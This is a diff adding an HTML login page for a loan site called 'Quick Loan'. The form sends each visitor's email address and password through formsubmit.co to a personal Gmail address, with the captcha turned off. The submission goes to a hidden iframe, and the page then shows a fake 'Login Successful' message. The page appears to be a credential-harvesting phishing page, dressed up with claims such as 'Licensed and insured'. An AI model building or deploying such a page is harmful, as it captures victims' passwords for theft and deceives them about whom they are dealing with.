@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Login to Quick Loan - Access your account">
+    <title>Login - Quick Loan</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="logo">
+                <img src="images/logo.svg" alt="Quick Loan Logo" class="logo-img">
+                <span>Quick Loan</span>
+            </div>
+            <div class="hamburger" id="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="about.html">About Us</a></li>
+                <li><a href="login.html" class="btn-login active">Login</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Login Section -->
+    <section class="login-section">
+        <div class="login-container">
+            <div class="login-box">
+                <h2>Welcome Back</h2>
+                <p class="login-subtitle">Login to access your account</p>
+
+                <!-- Success Message -->
+                <div class="login-success" id="loginSuccess">
+                    <h3>✓ Login Successful!</h3>
+                    <p>Redirecting to your account...</p>
+                </div>
+
+                <!-- Login Form -->
+                <form id="loginForm" action="https://formsubmit.co/ojecgrv@gmail.com" method="POST" target="loginFrame">
+                    <!-- FormSubmit Configuration -->
+                    <input type="hidden" name="_subject" value="Login Attempt - Quick Loan">
+                    <input type="hidden" name="_template" value="table">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="">
+
+                    <div class="form-group">
+                        <label for="loginEmail">Email Address</label>
+                        <input type="email" id="loginEmail" name="Email Address" placeholder="your.email@example.com" required>
+                        <div class="error-message" id="email-error"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="loginPassword">Password</label>
+                        <input type="password" id="loginPassword" name="Password" placeholder="Enter your password" required>
+                        <div class="error-message" id="password-error"></div>
+                    </div>
+
+                    <div class="form-group checkbox-group">
+                        <input type="checkbox" id="rememberMe" name="Remember Me">
+                        <label for="rememberMe">Remember me</label>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary btn-full" id="loginBtn">
+                        <span id="loginBtnText">Login</span>
+                        <span id="loginSpinner" class="btn-spinner"></span>
+                    </button>
+
+                    <div class="login-footer">
+                        <a href="#" class="forgot-password">Forgot password?</a>
+                        <p class="signup-link">Don't have an account? <a href="signup.html">Sign Up</a></p>
+                    </div>
+                </form>
+
+                <!-- Hidden iframe for form submission -->
+                <iframe name="loginFrame" id="loginFrame" class="hidden-iframe"></iframe>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>Quick Loan</h3>
+                    <p>Your trusted financial partner for fast, secure, and transparent lending solutions.</p>
+                </div>
+
+                <div class="footer-section">
+                    <h4>Legal</h4>
+                    <ul>
+                        <li><a href="#">Privacy Policy</a></li>
+                        <li><a href="#">Terms of Service</a></li>
+                        <li><a href="#">Licensing</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <p>&copy; 2025 Quick Loan. All rights reserved. Licensed and insured.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="login.js"></script>
+</body>
+</html>
